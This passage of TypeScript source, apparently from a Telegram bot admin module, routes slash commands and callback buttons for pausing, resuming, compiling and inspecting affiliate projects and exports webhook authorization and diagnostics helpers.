      return;

    case "/project":
      if (!args[0]) {
        await sendMessage(chatId, "📁 Usage: /project &lt;projectId&gt;");
        return;
      }
      await sendProjectSummary(chatId, args[0]);
      return;

    case "/pause":
      if (!args[0]) {
        await sendMessage(chatId, "⏸ Usage: /pause &lt;projectId&gt;");
        return;
      }
      await handleProjectStatusMutation(chatId, args[0], "paused");
      return;

    case "/resume":
      if (!args[0]) {
        await sendMessage(chatId, "▶️ Usage: /resume &lt;projectId&gt;");
        return;
      }
      await handleProjectStatusMutation(chatId, args[0], "active");
      return;

    case "/notify":
      if (args.length < 2) {
        await sendMessage(chatId, "📣 Usage: /notify &lt;projectId&gt; &lt;message&gt;");
        return;
      }
      await handleNotifyCommand(chatId, args[0], args.slice(1).join(" "));
      return;

    default:
      await sendMessage(chatId, "❓ Unknown command. Use /help.");
  }
}

async function handleCallback(query: TelegramCallbackQuery) {
  const chatId = String(query.message?.chat.id || query.from.id);
  if (!isAdminChat(chatId)) return;

  const data = query.data || "";
  const parts = data.split(":");
  const [action, arg1, arg2] = parts;

  switch (action) {
    // ── Menu shortcuts ──
    case "menu":
      switch (arg1) {
        case "ops":
          await answerCallbackQuery(query.id);
          await sendOpsDashboard(chatId);
          return;
        case "health":
          await answerCallbackQuery(query.id);
          await sendHealthDetail(chatId);
          return;
        case "relay":
          await answerCallbackQuery(query.id);
          await sendRelayDetail(chatId);
          return;
        case "builds":
          await answerCallbackQuery(query.id);
          await sendBuildsDetail(chatId);
          return;
        case "stats":
          await answerCallbackQuery(query.id);
          await sendStatsDetail(chatId);
          return;
        case "projects":
          await answerCallbackQuery(query.id);
          await handleAdminProjects(chatId);
          return;
      }
      break;

    // ── Project actions ──
    case "project":
      await sendProjectSummary(chatId, arg1);
      await answerCallbackQuery(query.id, "Refreshed");
      return;

    case "projstats":
      await sendProjectStats(chatId, arg1);
      await answerCallbackQuery(query.id);
      return;

    case "domains": {
      const project = await getAffiliateProject(arg1);
      if (project) {
        await sendMessage(
          chatId,
          project.domains.length
            ? `🌐 <b>${escapeHtml(project.name)} domains</b>\n${project.domains.map((d) => `• <code>${d}</code>`).join("\n")}`
            : `🌐 <b>${escapeHtml(project.name)}</b> — no domains configured.`,
        );
      }
      await answerCallbackQuery(query.id);
      return;
    }

    case "compile":
      await answerCallbackQuery(query.id, "Compile started…");
      await handleCompileCommand(chatId, [arg1, arg2 || "medium"]);
      return;

    case "status":
      if (arg2 === "active" || arg2 === "paused") {
        await answerCallbackQuery(query.id, `→ ${arg2}`);
        await handleProjectStatusMutation(chatId, arg1, arg2);
        return;
      }
      break;
  }

  await answerCallbackQuery(query.id, "Unsupported action");
}

// ── Public exports ────────────────────────────────────────────────

export async function processTelegramUpdate(update: TelegramUpdate) {
  const message = update.message;
  if (message?.text) {
    const chatId = String(message.chat.id);
    await handleCommand(chatId, message.text);
    return;
  }

  if (update.callback_query) {
    await handleCallback(update.callback_query);
  }
}

export function isTelegramWebhookAuthorized(secretHeader: string | null) {
  const configured = getWebhookSecret();
  if (!configured) return true;
  return secretHeader === configured;
}

export function getTelegramBotDiagnostics() {
  return {
    enabled: Boolean(getBotToken()),
    webhookSecretConfigured: Boolean(getWebhookSecret()),
    adminChatIdsConfigured: getAllowedAdminChatIds().size,
  };
}
